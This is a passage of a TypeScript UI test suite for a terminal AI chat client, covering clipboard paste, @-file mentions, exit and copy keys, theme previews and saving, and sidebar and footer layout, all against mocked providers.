      const prompt = 'Compare @a.ts and @"b c.ts"\nTreat \\@literal and me@host as text please';
      const requests: OneShotRequest[] = [];
      const client: ChatClient = { chat: { completions: { async create(request) {
        requests.push(request);
        return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
          { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Compared." } },
        ] };
      } } } };
      const chat = new TuiChat(client, { cwd });
      const ui = mountChatUI(setup.renderer, chat, "test", {
        createClipboard: () => ({
          async read() { return { status: "read", representation: { mimeType: "text/plain", bytes: new TextEncoder().encode(prompt) } }; },
          async dispose() {},
        }),
      });
      if (method === "native") await setup.mockInput.pasteBracketedText(prompt);
      else setup.mockInput.pressKey("v", { [method]: true });
      await waitUntilIdle(ui); await setup.flush();
      assert.equal(ui.input.plainText, prompt);
      assert.equal(requests.length, 0);
      assert.deepEqual(chat.attachmentPaths, []);
      setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
      assert.equal(requests.length, 1);
      assert.deepEqual([...chat.sessionStats.files].sort(), ["a.ts", "b c.ts"]);
      const message = String(requests[0]!.messages.at(-1)!.content);
      assert.match(message, /FIRST_ATTACHMENT/);
      assert.match(message, /SECOND_ATTACHMENT/);
      assert.match(message, /Treat @literal and me@host as text/);
    } finally { await setup.dispose(); await rm(cwd, { recursive: true, force: true }); }
  });
}

test("delayed paste does not overwrite an edited draft and is cancelled on exit", async (t) => {
  localClipboardEnvironment(t);
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-paste-race-"));
  const setup = await createTestRenderer({ width: 100, height: 32, kittyKeyboard: true, remote: false });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    let resolve!: (result: ClipboardReadResult) => void;
    let signal: AbortSignal | undefined;
    let disposed = 0;
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test", {
      createClipboard: () => ({
        read(options) { signal = options.signal; return new Promise((done) => { resolve = done; }); },
        async dispose() { disposed++; },
      }),
    });
    ui.input.setText("draft"); ui.input.gotoBufferEnd();
    setup.mockInput.pressKey("v", { ctrl: true });
    ui.input.insertText(" changed");
    resolve({ status: "read", representation: { mimeType: "text/plain", bytes: new TextEncoder().encode("obsolete paste") } });
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.input.plainText, "draft changed");
    assert.match(setup.captureCharFrame(), /Draft changed while reading clipboard/);
    setup.mockInput.pressKey("v", { super: true });
    setup.renderer.destroy();
    assert.equal(signal?.aborted, true);
    resolve({ status: "cancelled" });
    await waitUntilIdle(ui);
    assert.equal(disposed, 1);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("remote sessions accept native paste without reading the remote machine clipboard", async (t) => {
  localClipboardEnvironment(t);
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-remote-paste-"));
  const setup = await createTestRenderer({ width: 100, height: 32, kittyKeyboard: true, remote: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    let created = 0;
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test", {
      createClipboard: () => { created++; throw new Error("must not access remote clipboard"); },
    });
    setup.mockInput.pressKey("v", { ctrl: true }); await waitUntilIdle(ui); await setup.flush();
    assert.equal(created, 0);
    assert.match(setup.captureCharFrame(), /Remote session/);
    await setup.mockInput.pasteBracketedText("native paste");
    assert.equal(ui.input.plainText, "native paste");
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("unavailable, empty, non-text and oversized clipboard contents preserve the draft", async (t) => {
  localClipboardEnvironment(t);
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-paste-failure-"));
  const setup = await createTestRenderer({ width: 100, height: 32, kittyKeyboard: true, remote: false });
  try {
    const results: ClipboardReadResult[] = [
      { status: "unsupported" }, { status: "timed-out" }, { status: "empty" },
      { status: "read", representation: { mimeType: "image/png", bytes: new Uint8Array([1, 2, 3]) } },
      { status: "read", representation: { mimeType: "text/plain", bytes: new Uint8Array(1024 * 1024 + 1) } },
      { status: "read", representation: { mimeType: "text/plain", bytes: new Uint8Array(0) } },
    ];
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test", {
      createClipboard: () => ({ async read() { return results.shift()!; }, async dispose() {} }),
    });
    ui.input.setText("preserve draft"); ui.input.setSelection(0, 8);
    for (let index = 0; index < 6; index++) {
      setup.mockInput.pressKey("v", { ctrl: true }); await waitUntilIdle(ui);
      assert.equal(ui.input.plainText, "preserve draft");
      assert.equal(setup.renderer.isDestroyed, false);
    }
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("Ctrl+C exits without a selection even after an answer; Ctrl+D exits with a selection", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-exit-"));
  try {
    for (const key of ["c", "d"]) {
      const setup = await createTestRenderer({ width: 80, height: 28, kittyKeyboard: true });
      try {
        const client: ChatClient = { chat: { completions: { async create() {
          return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
            { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Previous answer" } },
          ] };
        } } } };
        const chat = new TuiChat(client, { cwd });
        await chat.submit("Hello");
        const ui = mountChatUI(setup.renderer, chat, "test");
        const copied: string[] = [];
        setup.renderer.copyToClipboardOSC52 = (text) => { copied.push(text); return true; };
        ui.input.setText("draft");
        if (key === "d") ui.input.setSelection(0, 5);
        setup.mockInput.pressKey(key, { ctrl: true });
        await setup.renderer.closed;
        assert.equal(setup.renderer.isDestroyed, true);
        assert.deepEqual(copied, [], "exiting must not copy the last answer or draft");
      } finally { await setup.dispose(); }
    }
  } finally { await rm(cwd, { recursive: true, force: true }); }
});

test("Ctrl+C with highlighted text stays open even when the terminal clipboard is unavailable", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-copy-"));
  const setup = await createTestRenderer({ width: 90, height: 28, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    const copied: string[] = [];
    setup.renderer.copyToClipboardOSC52 = (text) => { copied.push(text); return false; };
    ui.input.setText("draft"); ui.input.setSelection(0, 5);
    setup.mockInput.pressCtrlC(); await setup.flush();
    assert.deepEqual(copied, ["draft"]);
    assert.equal(setup.renderer.isDestroyed, false);
    assert.match(setup.captureCharFrame(), /Clipboard unavailable/);
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("Escape dismisses mentions only until @ reopens them or the draft changes", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-reopen-"));
  const setup = await createTestRenderer({ width: 90, height: 28, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("must not ask"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    ui.setCandidates(["file.ts", "folder/"]);
    ui.input.setText("😀 "); ui.input.gotoBufferEnd();
    await setup.mockInput.typeText("@");
    assert.equal(ui.picker.visible, true);
    setup.mockInput.pressEscape();
    assert.equal(ui.picker.visible, false);
    await setup.mockInput.typeText("@");
    assert.equal(ui.picker.visible, true);
    assert.equal(ui.input.plainText, "😀 @", "reopening must not insert a duplicate @");
    setup.mockInput.pressEscape();
    setup.mockInput.pressBackspace();
    await setup.mockInput.typeText("@");
    assert.equal(ui.picker.visible, true, "deleting and retyping the same mention must reopen");
    assert.equal(ui.input.plainText, "😀 @");
    setup.mockInput.pressEscape();
    await setup.mockInput.typeText(" next @");
    assert.equal(ui.picker.visible, true, "a new mention opens without needing a query character");
    assert.equal(ui.input.plainText, "😀 @ next @");
  } finally {
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("submitted attachments appear while awaiting the provider and survive request failure", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-inflight-attachments-"));
  const setup = await createTestRenderer({ width: 150, height: 38, kittyKeyboard: true });
  let release!: () => void;
  const pending = new Promise<void>((resolve) => { release = resolve; });
  try {
    await mkdir(path.join(cwd, "src"));
    await writeFile(path.join(cwd, "src", "new-file.ts"), "const value = 1;\n");
    let started!: () => void;
    const requested = new Promise<void>((resolve) => { started = resolve; });
    let requests = 0;
    const client: ChatClient = { chat: { completions: { async create() {
      requests++; started(); await pending; throw new Error("Provider unavailable");
    } } } };
    const chat = new TuiChat(client, { cwd });
    const ui = mountChatUI(setup.renderer, chat, "test");
    ui.input.setText("Explain @src"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await requested; await setup.flush();
    assert.equal(ui.working, true);
    assert.deepEqual(chat.attachmentPaths, ["src"]);
    assert.deepEqual(chat.sessionStats.files, ["src/new-file.ts"]);
    assert.equal(chat.sessionStats.turns, 0, "usage and response counts wait for a completed response");
    assert.match(setup.captureCharFrame(), /Files referenced \(1\)/);
    assert.match(setup.captureCharFrame(), /src\/new-file\.ts/);
    release(); await waitUntilIdle(ui); await setup.flush();
    assert.deepEqual(chat.sessionStats.files, ["src/new-file.ts"]);
    assert.match(setup.captureCharFrame(), /src\/new-file\.ts/);
    assert.equal(ui.input.plainText, "Explain @src");
    assert.equal(requests, 1);
  } finally {
    release();
    await setup.dispose();
    await rm(cwd, { recursive: true, force: true });
  }
});

test("configured startup theme applies immediately and is restored after cancelling a preview", async () => {
  const setup = await createTestRenderer({ width: 150, height: 40, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("theme setup must not ask the model"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd: tmpdir() }), "test", { theme: "high-contrast-light" });
    await setup.flush();
    assert.deepEqual(ui.theme, { name: "high-contrast-light", mode: "light" });
    const palette = themePalette("high-contrast-light");
    assert.deepEqual(ui.input.backgroundColor.toInts(), parseColor(palette.panel).toInts());
    assert.deepEqual(ui.footerRight.fg.toInts(), parseColor(palette.accent).toInts());
    ui.input.setText("/theme "); ui.input.gotoBufferEnd(); await setup.flush();
    assert.match(popupRows(ui.picker).plainText, /› ✓ high-contrast-light · light/);
    ui.input.setText("/theme dracula"); ui.input.gotoBufferEnd(); await setup.flush();
    assert.equal(ui.theme.name, "dracula");
    setup.mockInput.pressEscape(); await setup.flush();
    assert.equal(ui.theme.name, "high-contrast-light");
    ui.input.setText("/new"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.theme.name, "high-contrast-light");
  } finally { await setup.dispose(); }
});

test("a confirmed theme choice is saved as the default; previews and cancels are not", async () => {
  const setup = await createTestRenderer({ width: 150, height: 40, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("saving must not ask the model"); } } } };
    const saved: string[] = [];
    let fail = false;
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd: tmpdir() }), "test", {
      saveTheme: async (name) => {
        if (fail) throw new Error("not writing tui.json: writable by every user");
        saved.push(name);
        return { file: "~/.config/ask/tui.json", warning: name === "github" ? "Saved, but env ASK_THEME also sets the theme and takes precedence next time." : undefined };
      },
    });
    const flush = async () => { for (let i = 0; i < 3; i++) { await new Promise((done) => setTimeout(done, 5)); await setup.flush(); } };
    ui.input.setText("/theme "); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressArrow("down"); await setup.flush();
    setup.mockInput.pressEscape(); await flush();
    assert.deepEqual(saved, [], "previewing and cancelling never saves");

    ui.input.setText("/theme nord"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressEnter(); await flush();
    assert.deepEqual(ui.theme, { name: "nord", mode: "dark" });
    assert.deepEqual(saved, ["nord"]);
    assert.match(setup.captureCharFrame(), /Theme: nord · dark · saved to ~\/\.config\/ask\/tui\.json/);

    ui.input.setText("/theme github"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressTab(); await flush();
    assert.deepEqual(saved, ["nord", "github"]);
    assert.match(setup.captureCharFrame(), /ASK_THEME also sets the theme and takes precedence/);

    fail = true;
    ui.input.setText("/theme dracula"); ui.input.gotoBufferEnd(); await setup.flush();
    setup.mockInput.pressEnter(); await flush();
    assert.deepEqual(ui.theme, { name: "dracula", mode: "dark" }, "the theme still applies for this run");
    assert.match(setup.captureCharFrame(), /Theme not saved: not writing tui\.json/);
    assert.match(setup.captureCharFrame(), /Theme: dracula · dark \(this run only\)/);
  } finally { await setup.dispose(); }
});

test("theme choices preview on navigation and filtering, restore on cancel and commit on selection", async () => {
  const setup = await createTestRenderer({ width: 150, height: 40, kittyKeyboard: true });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("previews must not ask the model"); } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd: tmpdir() }), "test");
    async function draft(value: string) { ui.input.setText(value); ui.input.gotoBufferEnd(); await setup.flush(); }
    function assertTheme(name: string, mode: "dark" | "light") {
      assert.deepEqual(ui.theme, { name, mode });
      assert.deepEqual(ui.input.backgroundColor.toInts(), parseColor(themePalette(name, mode).panel).toInts());
    }
    await draft("/theme ");
    assertTheme("ask", "dark");
    setup.mockInput.pressArrow("down"); await setup.flush();
    assertTheme("amoled", "dark");
    assert.equal(ui.picker.visible, true);
    assert.equal(ui.input.plainText, "/theme ");
    setup.mockInput.pressArrow("down"); await setup.flush();
    assertTheme("aura", "dark");
    setup.mockInput.pressArrow("up"); await setup.flush();
    assertTheme("amoled", "dark");
    setup.mockInput.pressEscape(); await setup.flush();
    assertTheme("ask", "dark");
    await draft("/theme dracula");
    assertTheme("dracula", "dark");
    assert.doesNotMatch(popupRows(ui.picker).plainText, /dracula · light/);
    await draft("/theme high-contrast");
    assertTheme("high-contrast", "dark");
    await setup.mockMouse.scroll(ui.picker.x + 3, ui.picker.y + 2, "down"); await setup.flush();
    assertTheme("high-contrast-light", "light");
    setup.resize(145, 38); await setup.flush();
    assertTheme("high-contrast-light", "light");
    setup.mockInput.pressEnter(); await setup.flush();
    assertTheme("high-contrast-light", "light");
    assert.equal(ui.picker.visible, false);
    await draft("/theme ");
    assertTheme("high-contrast-light", "light");
    assert.match(popupRows(ui.picker).plainText, /› ✓ high-contrast-light · light/);
    await draft("/theme github");
    assertTheme("github", "dark");
    await draft("/theme no-such-theme");
    assertTheme("high-contrast-light", "light");
    await draft("/theme nord dark");
    assertTheme("nord", "dark");
    await draft("/context ");
    assertTheme("high-contrast-light", "light");
    await draft("/theme nord dark");
    assertTheme("nord", "dark");
    setup.mockInput.pressTab(); await setup.flush();
    assertTheme("nord", "dark");
    await draft("/theme github");
    assertTheme("github", "dark");
    setup.mockInput.pressEscape(); await setup.flush();
    assertTheme("nord", "dark");
  } finally { await setup.dispose(); }
});

test("theme picker changes existing and future UI locally and retains colors through refresh and reset", async () => {
  const setup = await createTestRenderer({ width: 160, height: 42, kittyKeyboard: true });
  try {
    let requests = 0;
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "# Heading\n\nAnswer with **bold** and `code`." } },
      ] };
    } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd: tmpdir() }), "test");
    async function draft(text: string) { ui.input.setText(text); ui.input.gotoBufferEnd(); await setup.flush(); }
    await draft("Hello"); setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    const message = ui.transcript.getChildren().find((child) => child.id.startsWith("user-"));
    assert.ok(message instanceof BoxRenderable);
    const panel = message.getChildren().find((child) => child.id.endsWith("-body"));
    assert.ok(panel instanceof BoxRenderable);
    const text = panel.getChildren()[0];
    assert.ok(text instanceof TextRenderable);
    await draft("/theme"); setup.mockInput.pressEnter(); await setup.flush();
    assert.equal(ui.input.plainText, "/theme ");
    assert.match(popupRows(ui.picker).plainText, /✓ ask · dark/);
    await draft("/theme nonexistent"); setup.mockInput.pressEnter(); await setup.flush();
    assert.deepEqual(ui.theme, { name: "ask", mode: "dark" });
    assert.match(popupRows(ui.picker).plainText, /No matching themes/);
    setup.mockInput.pressEscape(); await setup.flush();
    assert.equal(ui.input.plainText, "");
    for (const [name, mode] of [["dracula", "dark"], ["high-contrast-light", "light"], ["github", "dark"], ["opencode", "dark"], ["lucent-orng", "dark"], ["vesper", "dark"], ["ask", "dark"]] as const) {
      await draft(`/theme ${name} ${mode}`);
      setup.mockInput.pressEnter(); await setup.flush();
      assert.deepEqual(ui.theme, { name, mode });
      assert.equal(ui.picker.visible, false);
      assert.equal(ui.input.plainText, "");
      const palette = themePalette(name, mode);
      assert.deepEqual(panel.backgroundColor.toInts(), parseColor(palette.panel).toInts());
      assert.deepEqual(panel.borderColor.toInts(), parseColor(palette.accent).toInts());
      assert.deepEqual(text.fg.toInts(), parseColor(palette.text).toInts());
      assert.deepEqual(ui.input.backgroundColor.toInts(), parseColor(palette.panel).toInts());
      assert.deepEqual(ui.input.selectionBg?.toInts(), parseColor(palette.selectionBg ?? palette.accent).toInts());
      assert.deepEqual(ui.input.selectionFg?.toInts(), parseColor(palette.selectionFg ?? palette.background).toInts());
      assert.deepEqual(ui.footerRight.fg.toInts(), parseColor(palette.accent).toInts());
      const cap: Renderable | undefined = message.getChildren()[0];
      assert.ok(cap instanceof TextRenderable);
      assert.deepEqual(cap.fg.toInts(), parseColor(palette.panel).toInts());
      assert.deepEqual(cap.bg.toInts(), parseColor(palette.background).toInts());
      const spans = setup.captureSpans().lines.flatMap((line) => line.spans);
      const heading = spans.find((span) => span.text.includes("Heading"));
      assert.ok(heading, setup.captureCharFrame());
      assert.deepEqual(heading.fg.toInts(), parseColor(palette.accent).toInts());
      const code = spans.find((span) => span.text === "code");
      assert.ok(code);
      assert.deepEqual(code.fg.toInts(), parseColor(palette.code).toInts());
      const strong = spans.find((span) => span.text === "bold");
      assert.ok(strong && (strong.attributes & TextAttributes.BOLD));
      assert.deepEqual(strong.fg.toInts(), parseColor(palette.text).toInts());
      await draft("/context "); await setup.flush();
      assert.deepEqual(popupRows(ui.picker).chunks[0]?.fg?.toInts(), parseColor(palette.text).toInts());
      setup.mockInput.pressEscape(); await setup.flush();
      setup.resize(155, 42); await setup.flush();
      assert.deepEqual(ui.sidebarDivider.borderColor.toInts(), parseColor(palette.border).toInts());
    }
    assert.deepEqual(ui.footerRight.fg.toInts(), parseColor(ASK_PALETTE.accent).toInts());
    await draft("/theme dracula dark"); setup.mockInput.pressTab(); await setup.flush();
    assert.equal(ui.theme.name, "dracula");
    await draft("Another"); setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    const newest = ui.transcript.getChildren().filter((child) => child.id.startsWith("user-")).at(-1)!;
    const newestPanel = newest.getChildren().find((child) => child.id.endsWith("-body"));
    assert.ok(newestPanel instanceof BoxRenderable);
    assert.deepEqual(newestPanel.backgroundColor.toInts(), parseColor(themePalette("dracula").panel).toInts());
    await draft("/new"); setup.mockInput.pressEnter(); await waitUntilIdle(ui); await setup.flush();
    assert.equal(ui.theme.name, "dracula");
    assert.equal(requests, 2, "theme selection, search and reset never call the model");
  } finally { await setup.dispose(); }
});

test("user messages match composer padding and caps while wrapping and resizing", async () => {
  const setup = await createTestRenderer({ width: 80, height: 40 });
  try {
    const client: ChatClient = { chat: { completions: { async create() {
      return { id: "test", object: "chat.completion", created: 0, model: "test", choices: [
        { index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } },
      ] };
    } } } };
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd: tmpdir() }), "test");
    const prompt = "Hello " + "x".repeat(90) + "\nNext line";
    ui.input.setText(prompt); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    const user = ui.transcript.getChildren().find((child) => child.id.startsWith("user-"));
    assert.ok(user instanceof BoxRenderable);
    const [top, body, bottom] = user.getChildren();
    assert.ok(top instanceof TextRenderable && body instanceof BoxRenderable && bottom instanceof TextRenderable);
    const text = body.getChildren()[0];
    assert.ok(text instanceof TextRenderable);
    assert.equal(text.plainText, prompt);
    for (const [width, height] of [[80, 40], [160, 42], [55, 30]]) {
      setup.resize(width!, height!); await setup.flush();
      assert.equal(text.x, body.x + 3);
      assert.equal(text.width, body.width - 5);
      assert.equal(user.height, text.height + 2);
      const frame = setup.captureCharFrame().split("\n");
      assert.equal(frame[top.y]!.slice(top.x, top.x + top.width), "▄".repeat(top.width));
      assert.equal(frame[bottom.y]!.slice(bottom.x, bottom.x + bottom.width), "▀".repeat(bottom.width));
      assert.match(frame[text.y]!.slice(body.x), /^│  Hello/);
    }
    await setup.mockMouse.drag(text.x, text.y, text.x + 4, text.y); await setup.flush();
    assert.equal(setup.renderer.getSelection()?.getSelectedText(), "Hello");
    assert.equal(top.selectable, false);
    assert.equal(bottom.selectable, false);
  } finally { await setup.dispose(); }
});

test("sidebar cwd is right aligned and preserves the path suffix when resized", async () => {
  const setup = await createTestRenderer({ width: 150, height: 38 });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("layout must not ask the model"); } } } };
    const cwd = "/long-parent-directory/projects/工具/e\u0301/ask";
    const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd }), "test");
    await setup.flush();
    const label = ui.sidebar.getChildren().find((child) => child.id === "sidebar-cwd");
    assert.ok(label instanceof TextRenderable);
    const cwdText: TextRenderable = label;
    function assertSuffix() {
      const displayed = cwdText.chunks.map((chunk) => chunk.text).join("");
      assert.equal(cwdText.textAlign, "right");
      assert.ok(displayed.startsWith("…"));
      assert.ok(cwd.endsWith(displayed.slice(1)));
      assert.ok(displayed.endsWith("/ask"));
      assert.ok(ui.input.editBuffer.measureText(displayed) <= cwdText.width);
      assert.ok(setup.captureCharFrame().split("\n")[cwdText.y]!.endsWith("/ask "), "visible path keeps its final directory at the right edge");
    }
    assertSuffix();
    setup.resize(120, 38); await setup.flush();
    assertSuffix();
    setup.resize(200, 38); await setup.flush();
    const y = ui.sidebarDivider.y + 2;
    await setup.mockMouse.drag(ui.sidebarDivider.x, y, 1, y); await setup.flush();
    assert.equal(label.chunks.map((chunk) => chunk.text).join(""), cwd, "widening restores the full path");
    await setup.mockMouse.drag(ui.sidebarDivider.x, y, 198, y); await setup.flush();
    assertSuffix();
  } finally { await setup.dispose(); }

  const small = await createTestRenderer({ width: 150, height: 38 });
  try {
    const client: ChatClient = { chat: { completions: { async create() { throw new Error("layout must not ask the model"); } } } };
    const ui = mountChatUI(small.renderer, new TuiChat(client, { cwd: "/ask" }), "test");
    await small.flush();
    const row = small.captureCharFrame().split("\n")[ui.footerRight.y]!;
    assert.ok(row.endsWith("/ask "), "short paths sit at the sidebar's right edge");
  } finally { await small.dispose(); }
});

test("footer percentages require both a capacity and complete provider usage", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-footer-percent-"));
  try {
    for (const scenario of [
      { capacity: undefined, usage: { prompt_tokens: 200, completion_tokens: 30, total_tokens: 230 }, expected: "0.2K tokens" },
      { capacity: 1000, usage: undefined, expected: "Tokens: unknown" },
      { capacity: 1000, usage: { prompt_tokens: 1200, completion_tokens: 30, total_tokens: 1230 }, expected: "1.2K tokens (123.0%)" },
    ]) {
      const setup = await createTestRenderer({ width: 100, height: 30 });
      try {
        const client: ChatClient = { chat: { completions: { async create() {
          return { id: "test", object: "chat.completion", created: 0, model: "test",
            choices: [{ index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: "Answer" } }],
            ...(scenario.usage ? { usage: scenario.usage } : {}),
          };
        } } } };
        const ui = mountChatUI(setup.renderer, new TuiChat(client, { cwd, contextWindow: scenario.capacity }), "test");
        ui.input.setText("Hello"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
        await waitUntilIdle(ui); await setup.flush();
        assert.equal(ui.footerRight.chunks.map((chunk) => chunk.text).join(""), scenario.expected);
      } finally { await setup.dispose(); }
    }
  } finally { await rm(cwd, { recursive: true, force: true }); }
});

test("footer/sidebar respond to usage, skills, files and resizing; copy is explicit and local", async () => {
  const cwd = await mkdtemp(path.join(tmpdir(), "ask-tui-ui-summary-"));
  const setup = await createTestRenderer({ width: 140, height: 42, kittyKeyboard: true });
  try {
    const root = path.join(cwd, "skills");
    await mkdir(root);
    await writeFile(path.join(root, "review.md"), "---\nname: code-review\n---\nReview carefully.");
    await writeFile(path.join(cwd, "example.ts"), "const example = true;\n");
    let requests = 0;
    const answer = "Copy this answer.\n\n```ts\nconst safe = 1;\n```";
    const client: ChatClient = { chat: { completions: { async create() {
      requests++;
      return { id: "test", object: "chat.completion", created: 0, model: "test",
        choices: [{ index: 0, finish_reason: "stop", logprobs: null, message: { role: "assistant", refusal: null, content: answer } }],
        usage: { prompt_tokens: 200, completion_tokens: 30, total_tokens: 230 },
      };
    } } } };
    const chat = new TuiChat(client, { cwd, skillRoots: [root], contextWindow: 1000 });
    await chat.selectSkills(["code-review"]);
    const ui = mountChatUI(setup.renderer, chat, "test");
    const copied: string[] = [];
    setup.renderer.copyToClipboardOSC52 = (text: string) => { copied.push(text); return true; };
    ui.input.setText("Explain @example.ts"); ui.input.gotoBufferEnd();
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    const frame = setup.captureCharFrame();
    assert.ok(ui.sidebar.visible);
    const summary = ui.sidebar.getChildren().flatMap((child) => child.getChildren()).find((child) => child.id === "session-summary");
    assert.ok(summary instanceof TextRenderable);
    for (const title of ["Session", "Context window", "Last response (input + output)", "Session totals", "Skills (1)", "Files referenced (1)"]) {
      const chunk: TextChunk | undefined = summary.chunks.find((part) => part.text.trim() === title);
      assert.ok(chunk, `missing sidebar title: ${title}`);
      assert.ok((chunk.attributes ?? 0) & TextAttributes.BOLD);
      assert.deepEqual(chunk.fg?.toInts(), [248, 250, 252, 255]);
    }
    const body = summary.chunks.find((part) => part.text.trim() === "test");
    assert.equal((body?.attributes ?? 0) & TextAttributes.BOLD, 0);
    assert.deepEqual(body?.fg?.toInts(), [203, 213, 225, 255]);
    const cwdLabel = ui.sidebar.getChildren().find((child) => child.id === "sidebar-cwd");
    assert.ok(cwdLabel instanceof TextRenderable);
    const displayedCwd = cwdLabel.chunks.map((chunk) => chunk.text).join("");
    assert.ok(displayedCwd.startsWith("…"));
    assert.ok(cwd.endsWith(displayedCwd.slice(1)));
    assert.equal((cwdLabel.chunks[0]?.attributes ?? 0) & TextAttributes.BOLD, 0);
    assert.equal(cwdLabel.y, ui.footerRight.y, "sidebar cwd and chat footer share the bottom row");
    assert.match(frame, /Context window/);
    assert.match(frame, /230 \/ 1,000 \(23.0%\)/);
    assert.match(frame, /code-review/);
    assert.match(frame, /Files referenced \(1\)/);
    assert.match(frame, /example.ts/);
    assert.doesNotMatch(frame, /Working directory/);
    assert.equal(ui.footerLeft.y, ui.footerRight.y);
    assert.equal(ui.footerRight.y, ui.composer.y + ui.composer.height, "footer directly follows the composer, without shortcut guidance or spacer rows");
    assert.doesNotMatch(frame, /Enter send\/select/);
    assert.equal(ui.footerRight.y, setup.renderer.height - 2);
    assert.equal(ui.footerRight.x + ui.footerRight.width, ui.composer.x + ui.composer.width);
    assert.ok(ui.footerRight.x + ui.footerRight.width < ui.sidebar.x);
    assert.match(frame.split("\n")[ui.footerRight.y]!, /0\.2K tokens \(23\.0%\)/);
    assert.deepEqual(copied, [], "responses must not change the clipboard automatically");
    ui.input.setText("/copy"); ui.input.gotoBufferEnd(); setup.mockInput.pressEnter();
    await waitUntilIdle(ui);
    assert.deepEqual(copied, [answer], "/copy copies the last answer, including Markdown fences");
    const rows = frame.split("\n");
    const row = rows.findIndex((line) => line.includes("Copy this answer."));
    assert.ok(row >= 0, frame);
    const column = rows[row]!.indexOf("Copy this answer.");
    await setup.mockMouse.drag(column, row, column + 8, row);
    await setup.flush();
    const selected = setup.renderer.getSelection()?.getSelectedText();
    assert.ok(selected?.includes("Copy"), "answer text can be mouse-selected");
    setup.mockInput.pressKey("c", { ctrl: true });
    assert.equal(copied.at(-1), selected);
    assert.equal(setup.renderer.isDestroyed, false);
    setup.renderer.clearSelection();
    ui.input.setText("draft selection"); ui.input.setSelection(0, 5);
    setup.mockInput.pressKey("c", { ctrl: true });
    assert.equal(copied.at(-1), "draft");
    ui.input.clearSelection(); ui.input.setText("/copy"); ui.input.gotoBufferEnd();
    setup.mockInput.pressEnter();
    await waitUntilIdle(ui); await setup.flush();
    assert.equal(copied.at(-1), answer);
    assert.equal(requests, 1, "copy and resizing never ask the model");
    setup.resize(SIDEBAR_MIN_WIDTH - 1, 30);
    await setup.flush();
    assert.equal(ui.sidebar.visible, false);
    assert.doesNotMatch(setup.captureCharFrame(), /Context window/);
    assert.match(setup.captureCharFrame().split("\n")[ui.footerRight.y]!, /0\.2K tokens \(23\.0%\)/);
    assert.equal(ui.composer.width, setup.renderer.width - 2);
    assert.equal(ui.input.width, ui.composer.width - 5);
    assert.equal(ui.footerRight.y, ui.composer.y + ui.composer.height);
    assert.equal(ui.footerRight.x + ui.footerRight.width, setup.renderer.width - 1);
    setup.resize(SIDEBAR_MIN_WIDTH, 42);
    await setup.flush();
    assert.equal(ui.sidebar.visible, true);
    assert.equal(ui.footerRight.x + ui.footerRight.width, ui.composer.x + ui.composer.width);
    assert.ok(ui.footerRight.x + ui.footerRight.width < ui.sidebar.x);
    assert.equal(cwdLabel.y, ui.footerRight.y);
